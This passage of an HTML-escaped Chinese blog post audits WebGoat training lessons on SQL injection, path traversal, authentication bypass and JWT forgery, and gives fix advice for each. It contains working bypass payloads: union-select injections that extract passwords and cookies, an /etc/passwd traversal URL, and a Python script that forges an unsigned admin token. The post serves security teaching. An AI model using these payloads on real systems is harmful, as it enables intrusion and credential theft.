hostname&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;else mac end&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SqlOnlyInputValidation&lt;/p&gt;
&lt;p&gt;限制用户输入内容不能包含空格，但是可以通过过 /**/ 注释，括号等绕过，过滤空格后直接调用 SQLInjectionLesson6a 的注入函数（字符拼接执行并直接输出结果），修复建议同 SQLInjectionLesson6a&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-1&amp;#x27;/**/union/**/select/**/userid,user_name,password,cookie,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,0/**/from/**/user_system_data/**/--/**/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SqlOnlyInputValidationOnKeywords&lt;/p&gt;
&lt;p&gt;对用户输入进行关键字’select’ &#39;from’进行了一次判断置空，并限制用户输入不能包含空格，可以通过双写 + 注释绕过绕过，建议使用预编译&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-1&amp;#x27;/**/union/**/selecselectt/**/userid,user_name,password,cookie,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,0/**/frfromom/**/user_system_data/**/--/**/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;任意文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件上传&#34;&gt;#&lt;/a&gt; 任意文件上传&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-2&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;文件上传功能允许用户将本地的文件通过 Web 页面提交到网站服务器上，但是如果不对用户上传的文件进行合法性验证，则攻击者可利用 Web 应用系统文件上传功能（如文件上传、图像上传等）的代码缺陷来上传任意文件或者 webshell，并在服务器上运行，以达到获取 Web 应用系统控制权限或其他目的。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-2&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;未对用户输入的参数进行合法性验证&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-2&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;path-traversal–&amp;gt;ProfileUpload&lt;/p&gt;
&lt;p&gt;获取前端上传的文件以及字符串 “fullName”&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@PostMapping(value = &amp;quot;/PathTraversal/profile-upload&amp;quot;, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;@ResponseBody&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; AttackResult &lt;span class=&#34;title&#34;&gt;uploadFileHandler&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;meta&#34;&gt;@RequestParam(&amp;quot;uploadedFile&amp;quot;)&lt;/span&gt; MultipartFile file, &lt;span class=&#34;meta&#34;&gt;@RequestParam(value = &amp;quot;fullName&amp;quot;, required = false)&lt;/span&gt; String fullName)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;.execute(file, fullName);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用父类 ProfileUploadBase，execute () 方法，判断文件和 &amp;quot;fullName&amp;quot; 非空后直接上传，并且 “fullName” 用作子路径名字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对 fullName 进行判断过滤&lt;/li&gt;
&lt;li&gt;使用适当的权限保护文件夹&lt;/li&gt;
&lt;li&gt;随机化重命名用户上传的文件名&lt;/li&gt;
&lt;li&gt;根据用户上传的文件类型重构文件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt01.png&#34; alt=&#34;&#34;&gt;&lt;img src=&#34;pt02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;path-traversal–&amp;gt;ProfileUploadFix&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对 “fullName” 过滤了 “…/”，但是因为 replace 并不能递归检测，所以可以通过双写绕过 (’…/./’)，修复建议同上&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; AttackResult &lt;span class=&#34;title&#34;&gt;uploadFileHandler&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(            &lt;span class=&#34;meta&#34;&gt;@RequestParam(&amp;quot;uploadedFileFix&amp;quot;)&lt;/span&gt; MultipartFile file,            &lt;span class=&#34;meta&#34;&gt;@RequestParam(value = &amp;quot;fullNameFix&amp;quot;, required = false)&lt;/span&gt; String fullName)&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;.execute(file, fullName != &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt; ? fullName.replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;../&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;);    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;path-traversal–&amp;gt;ProfileUploadRemoveUserInput&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;直接使用了源文件名，所以直接修改文件名即可，建议随机重命名文件名&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; AttackResult &lt;span class=&#34;title&#34;&gt;uploadFileHandler&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;meta&#34;&gt;@RequestParam(&amp;quot;uploadedFileRemoveUserInput&amp;quot;)&lt;/span&gt; MultipartFile file)&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;.execute(file, file.getOriginalFilename());    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt06.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;目录遍历&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录遍历&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-3&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;路径遍历，即利用路径回溯符 “…/” 跳出程序本身的限制目录实现下载任意文件。例如 Web 应用源码目录、Web 应用配置文件、敏感的系统文件（/etc/passwd、/etc/paswd）等。&lt;/p&gt;
&lt;p&gt;一个正常的 Web 功能请求：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.test.com/get-files.jsp?file=report.pdf&#34;&gt;http://www.test.com/get-files.jsp?file=report.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果 Web 应用存在路径遍历漏洞，则攻击者可以构造以下请求服务器敏感文件：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd&#34;&gt;http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-3&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;未对用户输入的参数进行合法性验证&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-3&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;path-traversal–&amp;gt;ProfileUploadRetrieval&lt;/p&gt;
&lt;p&gt;源码过滤了’…‘和’/’，但是可以通过 url 编码进行绕过&lt;/p&gt;
&lt;p&gt;根据参数 id 进行判断&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果用户输入的 id.jpg 存在，那么返回包中返回该图片的 base64 编码&lt;/p&gt;
&lt;p&gt;如果不存在，就返回 catPicturesDirectory 的父目录的所有文件信息，用逗号分割&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt09.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt07.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 使用适当的权限保护文件夹2. 禁止返回目录信息3. 对url编码后的参数也要进行解码过滤4. 统一404界面
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;身份认证绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#身份认证绕过&#34;&gt;#&lt;/a&gt; 身份认证绕过&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-4&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;业务流程由前端进行控制，服务器端对应的各功能分离，导致业务流程可被攻击者进行控制，从而绕过流程中的各项校验功能，达到攻击的目的。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-4&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;未对用户可控的参数进行合法性验证&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-4&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;auth-bypass–&amp;gt;VerifyAccount.completed()&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;)                    .feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;verify-account.cheated&amp;quot;&lt;/span&gt;)                    .output(&lt;span class=&#34;string&#34;&gt;&amp;quot;Yes, you guessed correctly, but see the feedback message&amp;quot;&lt;/span&gt;)                    .build();        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用 verificationHelper.didUserLikelylCheat ()&lt;/p&gt;
&lt;p&gt;将用户输入的问题用键值对的方式保存，并和后端代码存储的答案进行比较。&lt;/p&gt;
&lt;p&gt;但是 Mapper 在 get 一个不存在的键时，并不会报错，而是返回 null。所以用户可以通过控制 key 的值绕过。&lt;/p&gt;
&lt;p&gt;建议&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;若用户可控 key，那么应该先判断这个 key 是否合法&lt;/li&gt;
&lt;li&gt;设置不可控 key，直接将用户的输入作为 value 进行判断&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &amp;#123;        userSecQuestions.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;secQuestion0&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Dr. Watson&amp;quot;&lt;/span&gt;);        userSecQuestions.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;secQuestion1&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Baker Street&amp;quot;&lt;/span&gt;);    &amp;#125;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map&amp;lt;Integer, Map&amp;gt; secQuestionStore = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();    &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &amp;#123;        secQuestionStore.put(verifyUserId, userSecQuestions);    &amp;#125;    &lt;span class=&#34;comment&#34;&gt;// end &amp;#x27;data store set up&amp;#x27;    // this is to aid feedback in the attack process and is not intended to be part of the &amp;#x27;vulnerable&amp;#x27; code    public boolean didUserLikelylCheat(HashMap&amp;lt;String, String&amp;gt; submittedAnswers) &amp;#123;        boolean likely = false;        if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &amp;#123;            likely = true;        &amp;#125;        if ((submittedAnswers.containsKey(&amp;quot;secQuestion0&amp;quot;) &amp;amp;&amp;amp; submittedAnswers.get(&amp;quot;secQuestion0&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion0&amp;quot;)))                &amp;amp;&amp;amp; (submittedAnswers.containsKey(&amp;quot;secQuestion1&amp;quot;) &amp;amp;&amp;amp; submittedAnswers.get(&amp;quot;secQuestion1&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion1&amp;quot;)))) &amp;#123;            likely = true;        &amp;#125; else &amp;#123;            likely = false;        &amp;#125;        return likely;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ap01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;auth-bypass–&amp;gt;AccountVerificationHelper.verifyAccount()&lt;/p&gt;
&lt;p&gt;判断了 key 是否存在，但是不包含该 key 仍然可以绕过&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//end of cheating check ... the method below is the one of real interest. Can you find the flaw?    public boolean verifyAccount(Integer userId, HashMap&amp;lt;String, String&amp;gt; submittedQuestions) &amp;#123;        //short circuit if no questions are submitted        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &amp;#123;            return false;        &amp;#125;        if (submittedQuestions.containsKey(&amp;quot;secQuestion0&amp;quot;) &amp;amp;&amp;amp; !submittedQuestions.get(&amp;quot;secQuestion0&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion0&amp;quot;))) &amp;#123;            return false;        &amp;#125;        if (submittedQuestions.containsKey(&amp;quot;secQuestion1&amp;quot;) &amp;amp;&amp;amp; !submittedQuestions.get(&amp;quot;secQuestion1&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion1&amp;quot;))) &amp;#123;            return false;        &amp;#125;        // else        return true;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;建议修改为&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;;        &amp;#125;&lt;span class=&#34;comment&#34;&gt;// 同时判断key和对应的value        if (submittedQuestions.containsKey(&amp;quot;secQuestion0&amp;quot;) &amp;amp;&amp;amp; submittedQuestions.get(&amp;quot;secQuestion0&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion0&amp;quot;)) &amp;amp;&amp;amp; submittedQuestions.containsKey(&amp;quot;secQuestion1&amp;quot;) &amp;amp;&amp;amp; submittedQuestions.get(&amp;quot;secQuestion1&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion1&amp;quot;))) &amp;#123;            return true;        &amp;#125;        // else        return false;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;作者没写这个功能点，就是在源码里面问了一下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;JWT&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTVotesEndpoint.vote()&lt;/p&gt;
&lt;p&gt;没有验证签名，直接判断 token 中的 admin 对应值是否为 true，所以把 token 中的 alg 设置为 none，admin 设置为 true 即可（亲测 bp 转换的不行）&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (StringUtils.isEmpty(accessToken)) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;jwt-invalid-token&amp;quot;&lt;/span&gt;).build();        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);                Claims claims = (Claims) jwt.getBody();                &lt;span class=&#34;keyword&#34;&gt;boolean&lt;/span&gt; isAdmin = Boolean.valueOf((String) claims.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;));                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!isAdmin) &amp;#123;                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;jwt-only-admin&amp;quot;&lt;/span&gt;).build();                &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;                    votes.values().forEach(vote -&amp;gt; vote.reset());                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).build();                &amp;#125;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (JwtException e) &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;jwt-invalid-token&amp;quot;&lt;/span&gt;).output(e.toString()).build();            &amp;#125;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;转换脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding:utf-8 -*-import jwtimport base64# header# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &amp;#123;&amp;quot;typ&amp;quot;:&amp;quot;JWT&amp;quot;,&amp;quot;alg&amp;quot;:&amp;quot;HS256&amp;quot;&amp;#125;#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &amp;#123;&amp;quot;iss&amp;quot;:&amp;quot;http:\/\/demo.sjoerdlangkemper.nl\/&amp;quot;,&amp;quot;iat&amp;quot;:1504006435,&amp;quot;exp&amp;quot;:1504006555,&amp;quot;data&amp;quot;:&amp;#123;&amp;quot;hello&amp;quot;:&amp;quot;world&amp;quot;&amp;#125;&amp;#125;def b64urlencode(data):    return base64.b64encode(data).replace(b&amp;#x27;+&amp;#x27;, b&amp;#x27;-&amp;#x27;).replace(b&amp;#x27;/&amp;#x27;, b&amp;#x27;_&amp;#x27;).replace(b&amp;#x27;=&amp;#x27;, b&amp;#x27;&amp;#x27;)print(b64urlencode(b&amp;#x27;&amp;#123;&amp;quot;alg&amp;quot;:&amp;quot;none&amp;quot;&amp;#125;&amp;#x27;)+b&amp;#x27;.&amp;#x27;+b64urlencode(b&amp;#x27;&amp;#123;&amp;quot;iat&amp;quot;:1673470025,&amp;quot;admin&amp;quot;:&amp;quot;true&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;Tom&amp;quot;&amp;#125;&amp;#x27;)+b&amp;#x27;.&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTSecretKeyEndpoint.login()&lt;/p&gt;
&lt;p&gt;随机取数组中的值进行加密，可以用字典进行爆破&lt;/p&gt;
